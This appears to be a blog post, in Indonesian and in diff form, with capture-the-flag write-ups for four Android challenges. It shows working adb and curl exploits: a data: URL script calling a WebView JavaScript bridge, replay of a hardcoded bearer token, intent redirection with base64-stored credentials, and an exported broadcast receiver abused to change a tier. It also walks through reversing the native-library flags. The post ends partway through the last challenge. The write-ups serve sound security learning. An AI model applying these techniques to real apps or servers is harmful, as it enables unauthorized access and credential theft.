@@ -1,0 +1,1086 @@
+---
+layout: post
+title: "Nahamcon Winter CTF - Mobile"
+date: 2025-12-18
+image: /assets/.
+categories: ["Nahamcon"]
+tags: [mobile, java, ctf2025]
+excerpt: " "
+---
+
+## Bug Bounty Hub
+
+### Intro
+
+Di atas kertas, **BugBountyHub** ini app “rapi”: bantu bug hunter nyatet laporan, terus ada fitur **preview** biar report kamu kelihatan profesional karena bisa render HTML.
+
+Tapi ada satu masalah klasik yang sering jadi biang kerok di mobile: *“HTML preview” + `WebView` + `JavaScript enabled` + “boleh load URL dari luar”*.
+
+Di write-up ini aku ceritain alurnya dari recon sampai exploit, lalu (bonus) aku bongkar juga “token admin” yang diambil dari native library—biar kelihatan full picture-nya, bukan cuma “tembak payload, dapet flag”.
+
+---
+
+### Recon: “ini APK ngapain, dan pintu masuknya di mana?”
+
+Mulai dari hal yang paling boring tapi paling penting: identitas package.
+
+```bash
+$ aapt dump badging bugbountyhub.apk | head
+package: name='com.example.bugbountyhub' versionCode='1' versionName='1.0' ...
+sdkVersion:'24'
+targetSdkVersion:'36'
+uses-permission: name='android.permission.INTERNET'
+```
+
+Terus aku decode APK supaya bisa baca `AndroidManifest.xml` dan smali dengan enak:
+
+```bash
+$ apktool d -f -o apktool_out bugbountyhub.apk
+```
+
+Manifest-nya langsung kasih clue besar:
+
+- `android:debuggable="true"` dan `android:testOnly="true"` (ini challenge, tapi juga berarti developer nggak terlalu “defensive”).
+- Yang paling penting: `MainActivity` **exported**.
+
+```xml
+<activity
+  android:name="com.example.bugbountyhub.MainActivity"
+  android:exported="true">
+  ...
+</activity>
+```
+
+`android:exported="true"` artinya: *aplikasi lain / adb / siapa pun bisa manggil activity ini lewat intent*.
+
+---
+
+### Ngikuti jejak “preview HTML”: dari intent → WebView
+
+Karena deskripsinya bilang “preview feature supports HTML rendering”, target alami adalah `WebView`.
+
+Aku cari hal-hal yang biasanya muncul: `WebView`, `loadUrl`, `addJavascriptInterface`, atau extra intent yang terlihat seperti URL.
+
+```bash
+$ rg -n "report_url|loadUrl|addJavascriptInterface|WebView" apktool_out/smali* | head
+```
+
+Ketemu di `MainActivity.smali`. Potongan yang paling “banyak bicara” adalah ini:
+
+1) **JavaScript dihidupin**:
+
+```smali
+invoke-virtual {v0, v4}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
+```
+
+2) Ada **JavascriptInterface** bernama `"Android"`:
+
+```smali
+new-instance v3, Lcom/example/bugbountyhub/AppBridge;
+...
+const-string v4, "Android"
+invoke-virtual {v0, v3, v4}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V
+```
+
+3) Dan ini yang jadi “jalan tol” exploit: activity mengambil intent extra `report_url` lalu langsung `loadUrl()`:
+
+```smali
+const-string v3, "report_url"
+invoke-virtual {v0, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
+...
+invoke-virtual {v1, v0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V
+```
+
+Artinya: **aku bisa membuka URL apa pun di dalam WebView app ini**, dan URL itu akan jalan dengan:
+
+- JavaScript enabled
+- Ada bridge `Android` (native power via `@JavascriptInterface`)
+
+Kalau ini app beneran, ini sudah kategori *critical design flaw*.
+
+---
+
+### Inti bug-nya: WebView jadi “browser” yang bawa kunci rumah
+
+`addJavascriptInterface()` bukan sekadar “fitur”; itu literally bikin fungsi Java/Kotlin bisa dipanggil dari JavaScript.
+
+Di `AppBridge.smali`, app expose method `getToken()` ke JS:
+
+```smali
+.method public final getToken()Ljava/lang/String;
+    .annotation runtime Landroid/webkit/JavascriptInterface;
+    .end annotation
+    sget-object v0, Lcom/example/bugbountyhub/NativeLib;->INSTANCE:Lcom/example/bugbountyhub/NativeLib;
+    invoke-virtual {v0}, Lcom/example/bugbountyhub/NativeLib;->getAdminToken()Ljava/lang/String;
+    move-result-object v0
+    return-object v0
+.end method
+```
+
+Jadi dari JavaScript, kita tinggal:
+
+```js
+Android.getToken()
+```
+
+Masalahnya tinggal satu: **gimana caranya kita menyuntikkan JS yang bisa jalan di WebView itu?**
+
+Jawabannya: `report_url` tadi. Karena dia `loadUrl()` string mentah dari intent, kita bisa kasih `data:` URL (HTML inlined) yang berisi `<script>...</script>`.
+
+---
+
+### Exploit: panggil `MainActivity` lewat adb, injeksi `data:` URL, baca token
+
+Install note dari soal: pakai `adb -t install`:
+
+```bash
+$ adb -t install bugbountyhub.apk
+```
+
+Lalu trigger `MainActivity` dan injeksi HTML+JS via `data:` URL:
+
+```bash
+$ adb shell am start \
+  -n com.example.bugbountyhub/.MainActivity \
+  --es report_url "data:text/html,%3Cscript%3Edocument.body.innerText%3DAndroid.getToken()%3C%2Fscript%3E"
+```
+
+Payload itu adalah versi URL-encoded dari:
+
+```html
+<script>document.body.innerText=Android.getToken()</script>
+```
+
+Hasilnya: WebView akan menampilkan token admin—yang di challenge ini adalah flag:
+
+```
+flag{Br1dg3_t0_N4t1v3_W0r!d}
+```
+
+Kenapa ini work?
+
+- Activity exported ⇒ bisa dipanggil dari luar
+- `report_url` untrusted ⇒ bisa diarahkan ke konten attacker
+- JavaScript enabled + JS bridge ⇒ attacker bisa panggil `Android.getToken()`
+
+---
+
+## Bonus RE: dari mana token/flag itu berasal? (nativecore)
+
+Karena `getToken()` memanggil native method, aku cek native library-nya:
+
+```bash
+$ find apktool_out/lib -type f
+apktool_out/lib/x86_64/libnativecore.so
+```
+
+Symbol dynamic-nya masih cukup ramah untuk hunting:
+
+```bash
+$ nm -D --defined-only apktool_out/lib/x86_64/libnativecore.so | rg 'decodeToken|getAdminToken'
+00000000000268c0 T Java_com_example_bugbountyhub_NativeLib_getAdminToken
+00000000000264a0 T _Z11decodeTokenv
+```
+
+Alamat penting:
+
+- `decodeToken()` di `.text`: **0x000264a0**
+- `Java_com_example_bugbountyhub_NativeLib_getAdminToken`: **0x000268c0**
+
+Di `decodeToken()`, ada blob byte di `.rodata` yang diproses. Blob ini muncul di file sebagai 28 byte pertama `.rodata` (offset **0x14e40**):
+
+```bash
+$ xxd -g 1 -l 0x1c -s 0x14e40 apktool_out/lib/x86_64/libnativecore.so
+00014e40: 3a cd 35 a6 39 bc 9c 91 10 3e 39 57 5c 50 35 d6
+00014e50: 20 89 48 27 cf 00 26 86 66 5d 82 36
+```
+
+Kalau kita “terjemahkan” assembly loop-nya (mulai dari `decodeToken()` @ `0x264a0`), perilakunya kira-kira begini:
+
+### Pseudocode hasil konversi ASM
+
+```c
+// decodeToken() @ 0x264a0
+// enc bytes di .rodata (len=0x1c) lalu direverse dan ditransform byte-per-byte
+string decodeToken() {
+    uint8_t enc[0x1c] = { 0x3a, 0xcd, 0x35, ... , 0x82, 0x36 };
+    reverse(enc);
+
+    for (int i = 0; i < 0x1c; i++) {
+        uint8_t b = enc[i];
+
+        // parity-based XOR (lihat branch di sekitar 0x26582)
+        b ^= (i % 2 == 0) ? 0x7e : 0x3f;
+
+        // b = b - (i*5) (pattern LEA rcx,[i + i*4])
+        b = (uint8_t)(b - (i * 5));
+
+        // rotate-right dengan shift = (i%3)+1 (bagian magic multiply 0xAAAAAAAAAAAAAAAB)
+        int s = (i % 3) + 1;
+        b = ror8(b, s);
+
+        // final xor
+        b ^= 0x42;
+
+        out[i] = (char)b;
+    }
+
+    return string(out, 0x1c);
+}
+```
+
+Aku reimplement pseudo di atas pakai Python (persis buat “ngebuktiin” hasil):
+
+```bash
+$ python3 - <<'PY'
+enc = bytes.fromhex(
+  "3acd35a639bc9c91103e39575c5035d6"
+  "20894827cf002686665d8236"
+)
+enc = enc[::-1]
+
+def ror8(x, s):
+  return ((x >> s) | ((x << (8 - s)) & 0xff)) & 0xff
+
+out = bytearray()
+for i, b in enumerate(enc):
+  b ^= 0x7e if (i % 2 == 0) else 0x3f
+  b = (b - (i * 5)) & 0xff
+  b = ror8(b, (i % 3) + 1)
+  b ^= 0x42
+  out.append(b)
+
+print(out.decode())
+PY
+flag{Br1dg3_t0_N4t1v3_W0r!d}
+```
+
+Jadi token admin itu bukan “di-hardcode plain” di Java/Kotlin—dia disembunyikan di native, tapi tetap bisa diambil *tanpa permission apa pun*, cukup lewat `Android.getToken()`.
+
+
+### Flag
+
+`flag{Br1dg3_t0_N4t1v3_W0r!d}`
+
+---
+
+## Dojo Helper Center
+
+### Intro
+
+Aplikasi **Dojo YesWeHack Helpcenter** ini tampilannya kalem: cuma halaman kategori help center yang kalau diklik… ya paling banter nge-`Toast`. Tapi di CTF, “aplikasi yang kelihatan kosong” biasanya cuma topeng.
+
+Target kita sederhana: cari apa yang “kelupaan” sama dev-nya, lalu pakai buat ngebuka endpoint internal di challenge server:
+
+- Scope: `5g00e23ual31.ctfhub.io`
+- Artifact: `dojo-helpcenter.apk`
+
+Di write-up ini aku bawa kamu dari recon → decompile → nemu token → *langsung* ambil flag. Nggak pake drama panjang, tapi tetap berasa “ngejar jejaknya”.
+
+---
+
+### Recon: mulai dari APK dan jejak yang keliatan
+
+Pertama, pastikan ini APK beneran:
+
+```bash
+$ file dojo-helpcenter.apk
+dojo-helpcenter.apk: Android package (APK) ...
+```
+
+Aku biasanya langsung “bongkar dari dua sisi”:
+
+- `apktool` untuk resource + manifest + smali (enak buat lihat behavior low-level)
+- `jadx` untuk Java decompile (enak buat logic)
+
+```bash
+$ apktool d -f dojo-helpcenter.apk -o apktool_out
+$ jadx -d jadx_out dojo-helpcenter.apk
+```
+
+Ngintip `AndroidManifest.xml` juga kasih vibe “ini debug build”:
+
+```xml
+<application
+  android:allowBackup="true"
+  android:debuggable="true"
+  android:testOnly="true"
+  android:usesCleartextTraffic="true">
+```
+
+Ini red flag klasik—tapi flag-nya bukan dari backup. Jadi lanjut cari sesuatu yang bisa dipakai buat “ngomong” ke backend.
+
+---
+
+### Reverse Engineering: cari “urat nadi” (endpoint & credential)
+
+Trik paling hemat waktu di mobile RE: **cari string yang berbau network + auth**.
+
+```bash
+$ rg -n "http|https|Authorization|Bearer|token|api" -S jadx_out/sources
+```
+
+Hasilnya cepat mengerucut ke package app-nya:
+
+```bash
+$ find jadx_out/sources/com/example/helpcenter_yeswehack -maxdepth 1 -type f
+.../ApiClient.java
+.../Constants.java
+.../MainActivity.java
+.../ArticleListActivity.java
+```
+
+`MainActivity` cuma `Toast`. Yang menarik ada di `Constants.java`:
+
+```java
+// jadx_out/sources/com/example/helpcenter_yeswehack/Constants.java
+public class Constants {
+    public static final String API_TOKEN = "ZedrlHPRBlgpmEVwB601owCiMEcIaYtn";
+    public static final String BASE_URL = "https://fakeapi.dojo-yeswehack.com/";
+    ...
+}
+```
+
+Di titik ini aku sempat kejebak “arah yang keliatan obvious”: kalau ada `BASE_URL`, ya coba hit dulu.
+
+```bash
+$ curl -sS -D- https://fakeapi.dojo-yeswehack.com/help_center/collections | head
+HTTP/1.0 403 Forbidden
+...
+```
+
+403 + domain “fakeapi” = cukup jelas ini decoy. Jadi aku balik ke scope yang bener (`5g00e23ual31.ctfhub.io`) dan cari dokumentasi endpoint-nya.
+
+Kalau kamu lihat `ApiClient.java`, token ini dipakai buat header `Authorization: Bearer ...`:
+
+```java
+// jadx_out/sources/com/example/helpcenter_yeswehack/ApiClient.java
+conn.setRequestProperty("Authorization", "Bearer " + getAuthToken());
+```
+
+Nah, biar memenuhi “mode RE yang benar-benar RE”, aku juga cek versi smali-nya via apktool (lokasi “alamat” di APK):
+
+- `classes3.dex` → `apktool_out/smali_classes3/com/example/helpcenter_yeswehack/ApiClient.smali`
+
+Potongan smali `getAuthToken()`:
+
+```smali
+.method private static getAuthToken()Ljava/lang/String;
+    .locals 3
+
+    const-string v0, "ZedrlHPRBlgpmEVwB601owCiMEcIaYtn"
+    const/4 v1, 0x0
+    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
+    move-result-object v0
+
+    new-instance v1, Ljava/lang/String;
+    invoke-direct {v1, v0}, Ljava/lang/String;-><init>([B)V
+
+    const-string v2, "token:"
+    invoke-virtual {v1, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+    ...
+.end method
+```
+
+#### Pseudocode (convert dari smali)
+
+```text
+function getAuthToken():
+    decodedBytes = Base64.decode(Constants.API_TOKEN)
+    tokenString  = String(decodedBytes)
+    if tokenString startsWith "token:":
+        return tokenString.substring(6)
+    return tokenString
+```
+
+Intinya: **ada credential hardcoded**. Tinggal cari “backend benerannya” di mana token ini kepake.
+
+---
+
+### Recon ke Server: Swagger, endpoint, dan “pintu admin”
+
+Masuk ke scope challenge:
+
+```bash
+$ curl -sS https://5g00e23ual31.ctfhub.io/ | head
+... Swagger UI ...
+```
+
+Ambil swagger spec-nya:
+
+```bash
+$ curl -sS https://5g00e23ual31.ctfhub.io/api/swagger.json | head
+```
+
+Di sana ada endpoint admin yang menarik:
+
+- `GET /api/admin/internal` (butuh Bearer token)
+
+Swagger bahkan *nge-spoil* sumber token-nya: “Admin token found in mobile app”.
+
+Jadi kita nggak perlu nebak parameter aneh-aneh. Cukup bawa token hardcoded itu ke endpoint admin.
+
+---
+
+### Exploit: pakai token hardcoded → ambil flag
+
+Endpoint admin-nya ada di `https`, jadi langsung tembak dengan header `Authorization`.
+
+```bash
+$ curl -sS -L \
+  -H 'Authorization: Bearer ZedrlHPRBlgpmEVwB601owCiMEcIaYtn' \
+  https://5g00e23ual31.ctfhub.io/api/admin/internal
+```
+
+Output balik dalam JSON, dan flag ada di field `flag`:
+
+```json
+{"flag":"flag{3xp0s3d_Cr3ds_G03ssss_BrrRrr}", ...}
+```
+
+### Flag
+
+`flag{3xp0s3d_Cr3ds_G03ssss_BrrRrr}`
+
+---
+
+## Ebank
+
+### Intro
+
+Ebank ini tampilannya “bank app” yang rapi dan percaya diri. Tim dev-nya bahkan santai banget: *“security measures kami mantap.”*  
+Tapi rumor bilang ada user yang bisa buka fitur tersembunyi… tanpa harus punya akses yang semestinya.
+
+Dan ya—ini salah satu tipe bug mobile yang klasik, tapi masih sering kejadian: **Intent redirection / intent injection**. Kita nggak perlu jadi “premium”, cukup jadi “pintar ngirim Intent”.
+
+Di write-up ini aku ceritain alurnya dari nol: mulai recon APK, bongkar Activity-nya, nemu pintu belakang, sampai ngerakit flag yang sebagian disembunyiin di native library.
+
+---
+
+### Recon: “isi APK-nya apa aja?”
+
+Mulai dari inspeksi file:
+
+```bash
+$ ls -la
+Ebank.apk
+
+$ file Ebank.apk
+Ebank.apk: Zip archive data, at least v0.0 to extract, compression method=store
+```
+
+Karena ini Android, tool favorit: `apktool` buat resource/manifest, dan `jadx` buat source pseudo-Java.
+
+```bash
+$ apktool d -f -o out_apktool Ebank.apk
+
+$ jadx -d out_jadx "$(realpath Ebank.apk)"
+```
+
+Setelah decompile, hal pertama yang aku intip adalah **AndroidManifest**—tempat daftar pintu masuk aplikasi.
+
+```bash
+$ sed -n '1,120p' out_apktool/AndroidManifest.xml
+```
+
+Yang langsung nyantol:
+
+- `LoginActivity` **exported=true** (alias bisa dipanggil dari luar app).
+- `HomeActivity` dan `PremiumActivity` **exported=false** (harusnya “internal only”).
+
+Ini potongan pentingnya (lihat `out_jadx/resources/AndroidManifest.xml:30`):
+
+```xml
+<activity android:name="com.sehno.ebank.LoginActivity" android:exported="true" />
+<activity android:name="com.sehno.ebank.PremiumActivity" android:exported="false" />
+```
+
+Kalau ada fitur “hidden premium”, biasanya jalurnya: login → internal navigate → premium.
+Pertanyaannya: *bisa gak kita nyetir “navigate”-nya?*
+
+---
+
+### Ketemu “setir”-nya: LoginActivity percaya `redirect`
+
+Masuk ke `LoginActivity`:
+
+```bash
+$ nl -ba out_jadx/sources/com/sehno/ebank/LoginActivity.java | sed -n '120,180p'
+```
+
+Bagian yang jadi biang kerok:
+
+```java
+private final void redirectToNextActivity() {
+    Intent intent;
+    String redirectClass = getIntent().getStringExtra("redirect");
+    if (redirectClass != null) {
+        try {
+            intent = new Intent(this, Class.forName(redirectClass));
+        } catch (ClassNotFoundException e) {
+            intent = new Intent(this, (Class<?>) HomeActivity.class);
+        }
+    } else {
+        intent = new Intent(this, (Class<?>) HomeActivity.class);
+    }
+    startActivity(intent);
+    finish();
+}
+```
+
+Artinya simpel tapi fatal:
+
+> Setelah login sukses, app akan buka Activity apa pun yang kita tulis di extra `redirect` (via `Class.forName()`).
+
+`PremiumActivity` memang `exported=false`, tapi itu cuma mencegah **external app** memanggilnya langsung.  
+Kalau yang memanggil adalah **app itu sendiri** (karena kita “menyetir” `LoginActivity`), Android akan membolehkan.
+
+Jadi target exploit-nya jelas:
+
+1. Start `LoginActivity` dari luar (boleh, exported).
+2. Kirim extra `redirect=com.sehno.ebank.PremiumActivity`.
+3. Login beneran (biar `redirectToNextActivity()` kepanggil).
+4. App-nya sendiri yang buka `PremiumActivity`.
+
+---
+
+### “Login beneran” tapi kredensialnya… di strings.xml
+
+Sebelum ngegas, kita butuh credential valid.  
+`LoginActivity` decode base64 dari string resource `debug` dan `access`.
+
+Cari di `strings.xml`:
+
+```bash
+$ rg -n 'name="debug"|name="access"' out_apktool/res/values/strings.xml
+```
+
+Isinya:
+
+```xml
+<string name="debug">YWRtaW4=</string>
+<string name="access">UEBzc3cwcmQxMjMh</string>
+```
+
+Decode:
+
+```bash
+$ python3 - <<'PY'
+import base64
+print(base64.b64decode("YWRtaW4=").decode())
+print(base64.b64decode("UEBzc3cwcmQxMjMh").decode())
+PY
+admin
+P@ssw0rd123!
+```
+
+Oke. Username/password ketemu.
+
+---
+
+### Exploit: “kirim Intent, login, dan… masuk premium”
+
+Sekarang tinggal dorong Intent dari luar. Paling gampang via `adb`:
+
+```bash
+$ adb shell am start \
+  -n com.sehno.ebank/.LoginActivity \
+  --es redirect com.sehno.ebank.PremiumActivity
+```
+
+Di UI, login pakai:
+
+- username: `admin`
+- password: `P@ssw0rd123!`
+
+Begitu login sukses, `redirectToNextActivity()` akan membuka `PremiumActivity` (internal), dan di sana flag ditampilkan.
+
+Kalau kamu lihat `PremiumActivity`, dia literally nulis:
+
+```java
+flagTextView.setText(generateFlag());
+```
+
+Dan `generateFlag()` ngerakit flag dari 5 potongan.
+
+---
+
+### Reverse bagian flag: 4 potong Java, 1 potong native
+
+Lihat `PremiumActivity`:
+
+```bash
+$ nl -ba out_jadx/sources/com/sehno/ebank/PremiumActivity.java | sed -n '50,160p'
+```
+
+Konsepnya:
+
+```java
+return part1 + part2 + part3 + part4 + part5;
+```
+
+#### Part 1 (hex dibalik)
+
+`R.string.error_code_404` berisi `b77616c666` (lihat `out_jadx/resources/res/values/strings.xml:63`).
+Di Java, string itu di-reverse lalu diparse per 2 hex:
+
+Hasilnya: `flag{`
+
+#### Part 2 (XOR dengan key dari package name)
+
+Key dihitung dari jumlah ASCII semua karakter `getPackageName()` lalu mod 256.
+Untuk package `com.sehno.ebank`, hasilnya `0xB9` (185).
+XOR ke byte array `[-16, -41, -51, -118, -41, -51]` → `Int3nt`
+
+#### Part 3 (base64 biasa)
+
+`R.string.api_timeout_value = X1JlZCFy` → decode base64 → `_Red!r`
+
+#### Part 5 (bitwise NOT)
+
+`[-79, -102, -101, -126]` → `~b & 0xff` per byte → `Ned}`
+
+Sampai sini, kita punya:
+
+```
+flag{ + Int3nt + _Red!r + (part4) + Ned}
+```
+
+Yang masih hilang cuma part4—dan itu diambil dari native library `libebank.so`.
+
+---
+
+### Native part (Part 4): alamat fungsi + pseudocode dari ASM
+
+Library-nya ada di:
+
+```bash
+$ file out_apktool/lib/arm64-v8a/libebank.so
+ELF 64-bit LSB shared object, ARM aarch64, ... stripped
+```
+
+Walau stripped, symbol JNI biasanya masih keliatan. Pakai `readelf`:
+
+```bash
+$ readelf -Ws out_apktool/lib/arm64-v8a/libebank.so | rg 'Java_'
+```
+
+Yang penting:
+
+- `Java_com_sehno_ebank_NativeLib_getFlagPart` @ **0x000000000001ddc4**
+- `Java_com_sehno_ebank_NativeLib_getDecoyFlag` @ 0x000000000001dec0
+- `Java_com_sehno_ebank_NativeLib_getApiKey` @ 0x000000000001def0
+
+Disassembly bagian flag (pakai `llvm-objdump` biar ngerti AArch64):
+
+```bash
+$ llvm-objdump -d --arch=aarch64 --no-show-raw-insn \
+  --start-address=0x1ddc4 --stop-address=0x1de40 \
+  out_apktool/lib/arm64-v8a/libebank.so
+```
+
+Yang kelihatan: fungsi JNI ini cuma manggil helper `deobfuscate()` lalu `NewStringUTF`.
+
+Helper-nya:
+
+```bash
+$ readelf -Ws out_apktool/lib/arm64-v8a/libebank.so | rg 'deobfuscate'
+_Z11deobfuscatev  @ 0x000000000001dc40
+
+$ llvm-objdump -d --arch=aarch64 --no-show-raw-insn \
+  --start-address=0x1dc40 --stop-address=0x1dd18 \
+  out_apktool/lib/arm64-v8a/libebank.so
+```
+
+Di loop-nya ada pattern yang jelas:
+
+- load byte dari `.rodata`
+- `eor` dengan konstanta **0x7a**
+- append ke string output
+- stop saat ketemu `0x00` (null terminator)
+
+Alamat `.rodata` start dari section header:
+
+```bash
+$ readelf -S out_apktool/lib/arm64-v8a/libebank.so | rg '\\.rodata'
+[11] .rodata PROGBITS Address 0000000000013400 ...
+```
+
+Dan byte obfuscated-nya mulai di **0x0000000000013400**.
+
+#### Pseudocode
+
+Berikut pseudocode yang mewakili apa yang terjadi di native (disederhanakan biar enak dibaca):
+
+```c
+// .rodata @ 0x13400
+// obf = 1f 19 0e 33 4a 14 25 0a 2d 00
+
+string deobfuscate() {
+  string out = "";
+  for (int i = 0; ; i++) {
+    uint8_t b = rodata_0x13400[i];
+    if (b == 0) break;
+    out += (char)(b ^ 0x7a);
+  }
+  return out;
+}
+
+jstring Java_com_sehno_ebank_NativeLib_getFlagPart(JNIEnv* env, jobject thiz) {
+  string s = deobfuscate();
+  return env->NewStringUTF(s.c_str());
+}
+```
+
+Kalau dieksekusi, part4 = `ectI0n_pW`.
+
+---
+
+### Rakit semuanya
+
+Kalau kamu pengen ngerakit flag tanpa emulator, bisa murni dari reversing.
+Ini snippet Python yang “mengulang” logika `PremiumActivity` + native decode:
+
+```py
+import base64
+
+# part1: decodeHexReversed("b77616c666") -> "flag{"
+hex_string = "b77616c666"
+rev = hex_string[::-1]
+part1 = bytes(int(rev[i:i+2], 16) for i in range(0, len(rev), 2)).decode()
+
+# part2: xorDecode([-16,-41,-51,-118,-41,-51], deriveKey("com.sehno.ebank"))
+pkg = "com.sehno.ebank"
+key = sum(map(ord, pkg)) % 256
+obf2 = bytes((x + 256) % 256 for x in [-16, -41, -51, -118, -41, -51])
+part2 = bytes(b ^ key for b in obf2).decode()
+
+# part3: base64("X1JlZCFy") -> "_Red!r"
+part3 = base64.b64decode("X1JlZCFy").decode()
+
+# part4: native .rodata bytes xor 0x7a -> "ectI0n_pW"
+obf4 = bytes([0x1f, 0x19, 0x0e, 0x33, 0x4a, 0x14, 0x25, 0x0a, 0x2d])
+part4 = bytes(b ^ 0x7a for b in obf4).decode()
+
+# part5: deobfuscateBitwise([-79,-102,-101,-126]) -> "Ned}"
+obf5 = bytes((x + 256) % 256 for x in [-79, -102, -101, -126])
+part5 = bytes((~b) & 0xff for b in obf5).decode("latin1")
+
+print(part1 + part2 + part3 + part4 + part5)
+```
+
+Output:
+
+```
+flag{Int3nt_Red!rectI0n_pWNed}
+```
+
+### Flag
+
+`flag{Int3nt_Red!rectI0n_pWNed}`
+
+---
+
+## Magic Snowfall
+
+### Intro
+
+Ada tipe challenge mobile yang kelihatannya “imut”: aplikasi rewards, tombol refresh, poin salju, tier VIP… dan di ujungnya ada “prize” eksklusif. Tapi begitu kita pegang APK-nya, biasanya ada dua jalan:
+
+1) logic-nya cuma di UI / SharedPreferences (tinggal set nilai),
+2) atau ada yang “disembunyikan rapi” di native library.
+
+**Magic Snowfall** ternyata dua-duanya: ada jalur **unlock tier via broadcast**, lalu flag-nya disimpan di **JNI native (`libsnowflag.so`)** dengan obfuscation yang cukup “Medium” buat bikin kita harus nyemplung sebentar ke ASM.
+
+Di write-up ini aku ceritain dari recon sampai exploit: mulai dari manifest, nemu BroadcastReceiver yang exported, sampai ngebongkar cara `getFlag()` ngebentuk flag dari konstanta `.rodata`.
+
+---
+
+### Recon: APK ini ngapain sih?
+
+Mulai dari file yang diberikan:
+
+```bash
+$ ls -la
+MagicSnowfall.apk
+```
+
+Cek manifest dulu (paling cepat via `apktool`):
+
+```bash
+$ apktool d -f MagicSnowfall.apk -o out_apktool >/dev/null
+$ sed -n '1,120p' out_apktool/AndroidManifest.xml
+```
+
+Yang langsung nyolok:
+
+- `android:debuggable="true"` (biasanya developer “baik hati”)
+- ada `MainActivity` sebagai launcher
+- ada `receiver` exported:
+
+```xml
+<receiver
+  android:name="com.sehno.magicsnowfall.SnowRewardReceiver"
+  android:exported="true">
+  <intent-filter>
+    <action android:name="com.krypton.winterbank.ACTION_SNOWFALL_REWARD" />
+  </intent-filter>
+</receiver>
+```
+
+Receiver exported + action yang “bank-ish” = bau-bau **intent injection**.
+
+Lanjut decompile biar enak baca Kotlin/Java:
+
+```bash
+$ jadx -d out_jadx MagicSnowfall.apk
+```
+
+Target awal: kelas app sendiri di `com.sehno.magicsnowfall`.
+
+---
+
+### Cerita mulai seru: BroadcastReceiver yang kebuka buat publik
+
+Buka `SnowRewardReceiver`:
+
+```bash
+$ sed -n '1,220p' out_jadx/sources/com/sehno/magicsnowfall/SnowRewardReceiver.java
+```
+
+Ada tiga extra penting:
+
+- `bonus_points`
+- `bonus_tier`
+- `secret_key`
+
+Potongan logic-nya:
+
+```java
+if (secretKey != null && !secretKey.equals("winter2025")) {
+  Toast.makeText(context, "Invalid secret key", 0).show();
+  return;
+}
+
+int bonusPoints = intent.getIntExtra("bonus_points", 0);
+if (bonusPoints > 0) rewardManager.addPoints(bonusPoints);
+
+String bonusTier = intent.getStringExtra("bonus_tier");
+if (bonusTier != null && bonusTier.length() > 0) rewardManager.setTier(bonusTier);
+```
+
+Bagian paling lucu: **secret key itu opsional**.
+
+- Kalau kita kirim `secret_key` tapi salah → ditolak.
+- Kalau **nggak kirim `secret_key` sama sekali** → lolos.
+
+Jadi “pintu belakang” ini basically: *broadcast aja, bebas set tier*.
+
+---
+
+### Naik ke Aurora VIP: exploit paling gampang
+
+Karena receiver-nya exported, kita bisa trigger dari luar aplikasi pakai `adb`:
+
+```bash
+$ adb shell am broadcast \
+  -a com.krypton.winterbank.ACTION_SNOWFALL_REWARD \
+  --es bonus_tier aurora_vip
+```
+
+Opsional:
+
+```bash
+$ adb shell am broadcast \
+  -a com.krypton.winterbank.ACTION_SNOWFALL_REWARD \
+  --es bonus_tier aurora_vip \
+  --ei bonus_points 1337
+```
+
+Setelah itu buka app / tekan refresh: tier jadi Aurora VIP dan UI mulai mencoba menampilkan “prize”.
+
+Tapi… prize-nya bukan string biasa.
+
+---
+
+### Plot twist: flag-nya ternyata dipanggil lewat JNI native
+
+`MainActivity` punya logic:
+
+- baca `points` dan `tier` dari `SharedPreferences` via `SnowRewardManager`
+- kalau tier premium (`aurora_vip`) → panggil `FlagProvider.getFlag(tier)`
+
+Lihat bagian ini:
+
+```bash
+$ sed -n '1,240p' out_jadx/sources/com/sehno/magicsnowfall/MainActivity.java
+```
+
+Dan `FlagProvider`-nya:
+
+```bash
+$ sed -n '1,120p' out_jadx/sources/com/sehno/magicsnowfall/FlagProvider.java
+```
+
+Isinya singkat tapi bikin kita kerja:
+
+```java
+public final native String getFlag(String tier);
+
+static {
+  System.loadLibrary("snowflag");
+}
+```
+
+Artinya flag ada di `libsnowflag.so`.
+
+---
+
+### Bedah `libsnowflag.so`: cari entrypoint dan address penting
+
+Di APK hasil decode `apktool`, library-nya ada di beberapa ABI:
+
+```bash
+$ find out_apktool/lib -name 'libsnowflag.so'
+out_apktool/lib/arm64-v8a/libsnowflag.so
+out_apktool/lib/armeabi-v7a/libsnowflag.so
+out_apktool/lib/x86_64/libsnowflag.so
+out_apktool/lib/x86/libsnowflag.so
+```
+
+Aku pilih `x86_64` biar enak dibaca dengan `objdump/nm`.
+
+Cari simbol JNI:
+
+```bash
+$ nm -D --defined-only out_apktool/lib/x86_64/libsnowflag.so
+00000000000138a8 T Java_com_sehno_magicsnowfall_FlagProvider_getFlag
+0000000000013b7d T Java_com_sehno_magicsnowfall_FlagProvider_validateCoupon
+```
+
+Address yang akan kita pakai:
+
+- `getFlag` di `0x138a8`
+- `validateCoupon` di `0x13b7d`
+
+Sekarang intinya: `getFlag` ngapain sampai bisa “ngeluarin flag”?
+
+---
+
+### Dari ASM ke cerita yang kebaca: kunci ada di `.rodata`
+
+Kalau kita disassemble sedikit, ada bagian yang “nunjuk-nunjuk” ke data statis via RIP-relative `lea`.
+
+Contoh yang penting (di sekitar helper internal di `0x1434d`):
+
+```bash
+$ objdump -d -Mintel --start-address=0x1434d --stop-address=0x143a5 out_apktool/lib/x86_64/libsnowflag.so
+```
+
+Kita dapet pola ini:
+
+```asm
+0x0000000000014366: lea rsi, [rip+0x... ]  # 0x683c
+0x000000000001436d: lea rcx, [rip+0x... ]  # 0x67d0
+...
+```
+
+Dan di fungsi lain (sekitar `0x14238`) kita lihat:
+
+```asm
+0x0000000000014238: lea rsi, [rip+0x... ]  # 0x6810
+```
+
+Jadi ada 3 alamat `.rodata` yang jadi “harta karun”:
+
+- `0x6810` → string salt
+- `0x67d0` → 32 byte key (kelihatan random banget)
+- `0x683c` → 30 byte blob (calon ciphertext)
+
+Dump `.rodata` di range itu:
+
+```bash
+$ objdump -s -j .rodata --start-address=0x67d0 --stop-address=0x6890 out_apktool/lib/x86_64/libsnowflag.so
+```
+
+Kita lihat struktur yang rapi:
+
+- `0x67d0`: `1a 2d f6 d9 4e 80 ... 5e eb 53 d4` (32 byte)
